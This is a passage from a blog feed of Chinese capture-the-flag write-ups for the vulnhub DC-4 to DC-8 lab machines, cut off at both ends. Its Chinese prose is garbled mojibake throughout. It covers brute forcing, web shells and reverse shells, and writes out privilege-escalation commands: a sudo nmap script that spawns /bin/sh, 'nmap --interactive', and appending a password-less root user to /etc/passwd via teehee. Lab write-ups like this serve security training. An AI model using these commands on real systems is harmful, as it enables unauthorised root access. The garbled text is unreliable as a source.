æˆ‘ä»¬åˆ©ç”¨johnè¿›è¡Œè§£å¯†ã€‚</p><p>adminè¿™ä¸ªè´¦å·æ²¡æœ‰è·‘å‡ºæ¥ï¼Œä½†æ˜¯johnè¿™ä¸ªè´¦å·å¯ä»¥å¾—åˆ°å¯†ç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261923843.png" alt="image-20240426192320716"></p><p>è¿›è¡Œç™»å½•åå°</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261931375.png" alt="image-20240426193136297"></p><p>ç„¶åç»è¿‡ä¸€ç•ªå¯»æ‰¾ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥å†™phpä»£ç çš„åœ°æ–¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262013226.png" alt="image-20240426201343155"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014051.png" alt="image-20240426201359908"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014879.png" alt="image-20240426201415705"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262015372.png" alt="image-20240426201525253"></p><p>è¿™ä¸ªåœ°æ–¹éšä¾¿å¡«ä¸€ä¸‹ï¼Œç„¶åå»æäº¤ï¼Œå³å¯æ‰§è¡Œä»£ç ã€‚</p><p>è¿›è¡Œä¸€ä¸ªåå¼¹shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262018594.png" alt="image-20240426201831511"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å…ˆæ¥è¯•è¯•çœ‹suidææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262022359.png" alt="image-20240426202237290"></p><p>æœ‰ä¸€ä¸ªexim4 å…ˆæ¥æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262024710.png" alt="image-20240426202452562"></p><p>4.89ç‰ˆæœ¬çš„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262028385.png" alt="image-20240426202801103"></p><p>å¯ä»¥æŸ¥è¯¢åˆ°</p><p>å°†å…¶æ”¾åœ¨/var/www/htmlç›®å½•ä¸‹ ç„¶ååœ¨/tmpç›®å½•ä¸‹ï¼Œåˆ©ç”¨wgetä¸‹è½½ä¸‹æ¥ã€‚å¯¹è¿™ä¸ªshæ–‡ä»¶è¿›è¡Œ777çš„æƒé™ã€‚æœ€å./xxx.sh -m netcat è¿è¡Œå³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262043229.png" alt="image-20240426204331172"></p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-7</title>
    <link href="/2024/04/10/DC-7/"/>
    <url>/2024/04/10/DC-7/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101340212.png" alt="image-20240410134043971"></p><p>å¼€æ”¾äº†22å’Œ80ç«¯å£</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131911372.png" alt="image-20240413191115189"></p><p>å»è®¿é—®ï¼Œæç¤ºçš„ä¿¡æ¯æ˜¯è¿›è¡Œçˆ†ç ´çš„è¯å¯èƒ½ä¼šå¤±è´¥ï¼Œè¦è·³å‡ºæ¡†æ¡†æ€è€ƒ</p><p>è€ƒå¯Ÿçš„æ˜¯ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131927251.png" alt="image-20240413192741204"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131927914.png" alt="image-20240413192750874"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131928959.png" alt="image-20240413192802811"></p><p>sshè¿œç¨‹ç™»å½•è¿›å»</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131928073.png" alt="image-20240413192857903"></p><p>ç™»å½•æˆåŠŸ</p><p>å»mboxçœ‹ä¸€ä¸‹å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132051841.png" alt="image-20240413205101639"></p><p>å¤šæ¬¡æåˆ°è¿™ä¸ªè·¯å¾„ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132051956.png" alt="image-20240413205158847"></p><p>å¯ä»¥ä½¿ç”¨drushæ¥æ›´æ”¹adminçš„å¯†ç </p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹è¿›è¡Œä¿®æ”¹å¯†ç </p><p>ä¿®æ”¹å‘½ä»¤å‚è€ƒ:<a href="https://zhuanlan.zhihu.com/p/60880048">https://zhuanlan.zhihu.com/p/60880048</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132105520.png" alt="image-20240413210555443"></p><p>è¿›è¡Œç™»å½•</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132113230.png" alt="image-20240413211303114"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å»drupalå®˜ç½‘ä¸‹è½½phpçš„æ¨¡å—ï¼Œç„¶åä¸Šä¼ ä¸Šå»</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132135732.png" alt="image-20240413213503600"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132136111.png" alt="image-20240413213627025"></p><p>æ¥ç€æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ç« ï¼Œåœ¨é‡Œé¢å†™å…¥phpä»£ç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132137109.png" alt="image-20240413213731040"></p><p>è¿›è¡Œåå¼¹shell</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>backups.shæ–‡ä»¶æœ‰rootæƒé™</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132221942.png" alt="image-20240413222148879"></p><p>æ˜¯ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡</p><p>ç°åœ¨æ˜¯www-dataç”¨æˆ·ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥ä¸€ä¸ªåå¼¹shellçš„</p><p>æ³¨æ„åˆ©ç”¨&gt;&gt;</p><p>æœ€åå†è¿è¡Œè¿™ä¸ªshæ–‡ä»¶ ç­‰å¾…åå¼¹shellå³å¯</p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-6</title>
    <link href="/2024/04/09/DC-6/"/>
    <url>/2024/04/09/DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æä¸€æ³¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404100950784.png" alt="image-20240410095025563"></p><p>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†22å’Œ80ç«¯å£</p><p>è¿™é‡Œçš„è¯è·Ÿdc-2æƒ…å†µä¸€æ ·ï¼Œéœ€è¦å»ä¿®æ”¹/etc/hostsæ–‡ä»¶ ä¿®æ”¹DNSé…ç½®ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404100957338.png" alt="image-20240410095718233"></p><p>ç„¶åwindowsä¸‹ä¿®æ”¹æ˜¯åœ¨</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-string">&quot;C:\Windows\System32\drivers<span class="hljs-char escape_">\e</span>tc\hosts&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›®å½•ä¸‹çš„hostsæ–‡ä»¶</p><p>å®ƒæ˜¯ä¸€ä¸ªwordpressçš„cms ç‰ˆæœ¬æ˜¯5.1.1</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101004888.png" alt="image-20240410100413825"></p><p>åˆ©ç”¨wpscanå¯ä»¥æŠŠç”¨æˆ·åç»™çˆ†ç ´å‡ºæ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101022844.png" alt="image-20240410102237638"></p><p>åˆ©ç”¨cewlç”Ÿæˆå¯†ç å­—å…¸ ç„¶åå†åˆ©ç”¨wpscanè¿›è¡Œçˆ†ç ´</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101028263.png" alt="image-20240410102805011"></p><p>ä½†å¹¶æ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„è´¦å·å¯†ç </p><p>é‚£å°±æ¢ä¸€ä¸ªå­—å…¸å†æ¬¡è¯•è¯•çœ‹ è¿™æ¬¡åˆ©ç”¨çš„æ˜¯kaliè‡ªå¸¦çš„å¯†ç å­—å…¸ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101037818.png" alt="image-20240410103752731"></p><p>ä½†æ˜¯è¿™ä¸ªè·‘èµ·æ¥å¤ªå¤§äº† åæ¥ä¸Šç½‘çœ‹äº†ä¸€ä¸‹ å‘ç°å®˜ç½‘ä¸Šç»™äº†çº¿ç´¢ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101057246.png" alt="image-20240410105721206"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101059184.png" alt="image-20240410105929126"></p><p>æ¯”èµ·ä¹‹å‰é‚£ä¸ªå‡ åƒä¸‡çš„å°‘äº†å¾ˆå¤š</p><p>æœ€åå¾—åˆ°ä¸€ä¸ªè´¦æˆ·å¯†ç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101106827.png" alt="image-20240410110646754"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç»è¿‡ä¸€ç•ªå¯»æ‰¾ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101222402.png" alt="image-20240410122247317"></p><p>æ‰¾åˆ°äº†åœ°æ–¹ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101223825.png" alt="image-20240410122322772"></p><p>è¿›è¡Œä¸€ä¸ªåå¼¹shell</p><p>æœ‰é•¿åº¦é™åˆ¶ï¼ŒæŠ“åŒ…ä¿®æ”¹å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101227647.png" alt="image-20240410122726582"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿›å…¥homeç›®å½•çœ‹ä¸€ä¸‹ ï¼Œæœ‰å››ä¸ªç”¨æˆ·</p><p>å…ˆæŸ¥çœ‹markç”¨æˆ·çš„ä¿¡æ¯ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101231758.png" alt="image-20240410123154614"></p><p>è¿™ä¸ªä¿¡æ¯æŠŠgrahamçš„å¯†ç ç»™æš´æ¼äº†ï¼Œå»è¿›è¡Œsshè¿œç¨‹ç™»å½•</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101235901.png" alt="image-20240410123535702"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101235661.png" alt="image-20240410123558565"></p><p>å¯ä»¥çœ‹åˆ°ææƒçš„æœ‰å…³ä¿¡æ¯</p><p>æŸ¥çœ‹shæ–‡ä»¶å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101237592.png" alt="image-20240410123735550"></p><p>æˆ‘ä»¬å¯ä»¥å†è¿™ä¸ªshæ–‡ä»¶ä¸­å†™ä¸€ä¸ªåå¼¹shellçš„å‘½ä»¤ ç„¶åä»¥jensèº«ä»½è¿è¡Œ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101252136.png" alt="image-20240410125214029"></p><p>åå¼¹shellæˆåŠŸ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101253138.png" alt="image-20240410125318070"></p><p>æˆåŠŸåˆ‡æ¢åˆ°jensç”¨æˆ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101253476.png" alt="image-20240410125342363"></p><p>åˆ©ç”¨nmapææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101258838.png" alt="image-20240410125834737"></p><p>nmapæ˜¯7.4ç‰ˆæœ¬çš„</p><p>è€ç‰ˆæœ¬ææƒç”¨ä¸äº†ï¼Œè¿™é‡Œç”¨æ–°ç‰ˆæœ¬çš„nmapæå–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; /tmp/TF<br>sudo nmap --script=/tmp/TF<br></code></pre></td></tr></table></figure><p>è€ç‰ˆæœ¬çš„ææƒ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">nmap --interactive <br>ï¼sh<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101306567.png" alt="image-20240410130601438"></p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-5</title>
    <link href="/2024/04/07/DC-5/"/>
    <url>/2024/04/07/DC-5/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071858246.png" alt="image-20240407185828079"></p><p>å¼€å¯äº†80å’Œ111ç«¯å£</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">111</span>ç«¯å£æ˜¯RPCï¼ˆ<span class="hljs-comment">Remote Procedure Callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰æœåŠ¡çš„é»˜è®¤ç«¯å£ã€‚ RPCæ˜¯ä¸€ç§åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œå¯ç”¨äºåœ¨ä¸åŒçš„è®¡ç®—æœºä¹‹é—´ä¼ è¾“æ•°æ®ã€‚</span><br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å…ˆå»å„ä¸ªç•Œé¢çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…çš„å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081443603.png" alt="image-20240408144311373"></p><p>æƒ³åœ¨è¿™è¿›è¡Œxssæ¥ç€ï¼Œä½†æ˜¯ä¸å¤ªè¡Œã€‚</p><p>ç„¶åæ‰«äº†ä¸€ä¸‹åå°ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081444555.png" alt="image-20240408144412443"></p><p>æ²¡æ‰¾åˆ°æ¼æ´ç‚¹ã€‚ä½†æœ‰ä¸€ç‚¹å°±æ˜¯å¾ˆå¥‡æ€ª</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081445349.png" alt="image-20240408144520216"></p><p>æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™è¿™ä¸ªåœ°æ–¹ä¼šå˜åŠ¨ã€‚</p><p>è¿™ä¸ªå˜åŠ¨çš„ç‚¹å…¶å®å°±æ˜¯ä¸Šé¢çš„footer.phpçš„å†…å®¹ï¼Œè¿™é‡Œæ˜¯æŠŠè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ç»™åŒ…å«äº†ã€‚</p><p>å°è¯•ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081447346.png" alt="image-20240408144739201"></p><p>å‘ç°æ˜¯å­˜åœ¨çš„ã€‚</p><p>ç„¶åæ˜¯nginxæœåŠ¡å™¨ï¼Œå¯ä»¥è¯•è¯•æ—¥å¿—æ–‡ä»¶åŒ…å«ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081513999.png" alt="image-20240408151300889"></p><p>å‘ç°æ˜¯å¯ä»¥çš„ã€‚</p><p>ç„¶åå…ˆå†™ä¸€ä¸ªæœ¨é©¬åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç„¶åå†å»è®¿é—®è¿™ä¸ªæ—¥å¿—</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081514744.png" alt="image-20240408151419627"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081514220.png" alt="image-20240408151436022"></p><p>è¿æ¥èšå‰‘ï¼Œå¯ä»¥è¿æ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081543529.png" alt="image-20240408154305449"></p><p>æŠŠä¸€å¥è¯æœ¨é©¬æ¢æˆåå¼¹shellçš„å‘½ä»¤ï¼Œè¿›è¡Œåå¼¹shellã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081548003.png" alt="image-20240408154844872"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä¸‹ä¸€æ­¥å°±æ˜¯è¿›è¡Œææƒäº†</p><p>æˆ‘ä»¬è¿›è¡Œsudo -l å‘½ä»¤æ—¶å‘ç°æ²¡æœ‰sudoè¿™ä¸ªå‘½ä»¤çš„ç¯å¢ƒ</p><p>ç„¶åæˆ‘ä»¬æ‰¾ä¸€ä¸‹å…·æœ‰suidçš„å‘½ä»¤æœ‰å“ªäº›</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081612690.png" alt="image-20240408161239550"></p><p>è¿™ä¸¤ä¸ªå¯ä»¥ä¸€è¯•</p><p>exim4éœ€è¦å»æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081735559.png" alt="image-20240408173503461"></p><p>å»searchsploitæŸ¥ä¸€ä¸‹æ¼æ´ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081735631.png" alt="image-20240408173555467"></p><p>æ²¡æ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬æ¼æ´</p><p>é‚£å°±å»çœ‹ä¸€ä¸‹å¦ä¸€ä¸ª</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081739640.png" alt="image-20240408173901503"></p><p>ç‰ˆæœ¬åˆšå¥½å¯ä»¥å¯¹ä¸Š</p><p>åªæœ‰åœ¨/tmpç›®å½•ä¸‹æ‰å¯ä»¥wgetæ–‡ä»¶</p><p>ç„¶åæˆ‘ä»¬æŠŠshæ–‡ä»¶ä¸Šä¼ è¿›å»ä¹‹åï¼Œç»™å®ƒä¸€ä¸ª777çš„æƒé™ï¼Œè¿è¡Œshæ–‡ä»¶å³å¯ã€‚</p><p>ä¸è¦èšå‰‘ä¸Šä¼ ï¼Œè¦ä¸ç„¶ä¼šå› ä¸ºwindowså’Œlinuxçš„æ¢è¡Œç¬¦ä¸ä¸€æ ·è€ŒæŠ¥é”™ ç”¨wgetä¸Šä¼ åˆ°/tmpç›®å½•ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081811053.png" alt="image-20240408181128866"></p><p>ä½†æ˜¯æˆ‘ç»™è¿™ä¸ªshæ–‡ä»¶777çš„æƒé™ä¹‹åï¼Œå†æ¬¡è¿è¡Œä¼šæŠ¥é”™</p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2024/04/07/DC-4/"/>
    <url>/2024/04/07/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«ä¸€æ³¢ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071224033.png" alt="image-20240407122408898"></p><p>22å’Œ80ç«¯å£å¼€å¯</p><p>å…ˆå»è®¿é—®80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå°è¯•çˆ†ç ´ï¼Œæœªæœ (è¿˜æ˜¯å­—å…¸ä¸è¡Œå•Š)</p><p>å»æ‰«åå°ä¹Ÿæ²¡æ‰«åˆ°ä»€ä¹ˆä¸œè¥¿</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071242879.png" alt="image-20240407124252827"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æœ€åå‘ç°è¿˜å¾—çˆ†ç ´ï¼Œåˆ©ç”¨hydra</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071332201.png" alt="image-20240407133202073"></p><p>æ³¨æ„è¦æ·»åŠ  :S=logout è¿™ä¸ªæ„æ€å°±æ˜¯æˆåŠŸç™»å½•åï¼ŒHydraå°†å°è¯•æ‰§è¡Œç™»å‡ºæ“ä½œã€‚</p><p>è¿›å»ä¹‹åæœ‰ä¸‰ä¸ªæŒ‰é’®</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071345377.png" alt="image-20240407134541324"></p><p>æŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071346647.png" alt="image-20240407134634452"></p><p>åå¼¹ä¸ªshell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071347148.png" alt="image-20240407134757111"></p><p>ç°åœ¨è¿˜æ˜¯æ™®é€šç”¨æˆ·çš„çŠ¶æ€ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦ææƒäº†ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071349408.png" alt="image-20240407134940299"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ³¨æ„å‰é¢å¼€å¯äº†sshæœåŠ¡ï¼Œæ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹/etc/passwd</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071441212.png" alt="image-20240407144142941"></p><p>æœ‰ä¸¤ä¸ªå¯ç–‘ç”¨æˆ· ä½†æ˜¯çˆ†ç ´ä¸å‡ºæ¥å¯†ç  å»homeç›®å½•çœ‹çœ‹æƒ…å†µ è²Œä¼¼æ˜¯ä¸‰ä¸ªç”¨æˆ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071443805.png" alt="image-20240407144333713"></p><p>åªæœ‰jimç›®å½•ä¸‹æœ‰ä¸œè¥¿ï¼Œå…¶ä»–ç›®å½•ä¸‹éƒ½æ²¡æœ‰</p><p>ç„¶ååœ¨jimä¸‹é¢æ‰¾åˆ°äº†å¯†ç å­—å…¸</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071544362.png" alt="image-20240407154450265"></p><p>åˆ©ç”¨è¿™ä¸ªå­—å…¸å†å»çˆ†ç ´ssh</p><p>æŠŠè¿™ä¸ªå­—å…¸æ”¾åœ¨äº†1.txté‡Œé¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071458231.png" alt="image-20240407145807124"></p><p>å¯ä»¥å¾—åˆ°å¯†ç ä¿¡æ¯</p><p>ç„¶åsshç™»å½•jimç”¨æˆ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071513010.png" alt="image-20240407151322928"></p><p>æœ‰ä¸€å°é‚®ä»¶</p><p>æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥å¾—åˆ°charlesçš„å¯†ç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071519040.png" alt="image-20240407151905829"></p><p>åˆ†åˆ«å°è¯•åœ¨jimå’Œcharlesç”¨æˆ·ä¸‹è¿›è¡Œææƒï¼Œæµ‹è¯•è¿‡ååªæœ‰charleså¯ä»¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071522605.png" alt="image-20240407152259495"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071523306.png" alt="image-20240407152317236"></p><p>åˆ©ç”¨teeheeè¿›è¡Œææƒ</p><p>å‚è€ƒé“¾æ¥:</p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">https://www.cnblogs.com/zlgxzswjy/p/16118468.html</a></p><p>å®ƒæ˜¯ä¸€ä¸ªå°ä¼—çš„linuxç¼–è¯‘å™¨ï¼Œææƒæ€è·¯å°±æ˜¯å‘/etc/passwdä¸­æ·»åŠ ä¸€æ¡uidä¸º0çš„ç”¨æˆ· æœ€åå†åˆ‡æ¢åˆ°uidä¸º0çš„ç”¨æˆ·å³å¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;fsrm::0:0:::/bin/bash&quot;</span> | sudo teehee -a <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071527854.png" alt="image-20240407152749805"></p><p>æœ€ååˆ°www-dataç”¨æˆ·ä¸‹su ä¸€ä¸‹fsrm</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071535553.png" alt="image-20240407153543501"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆçˆ†ç 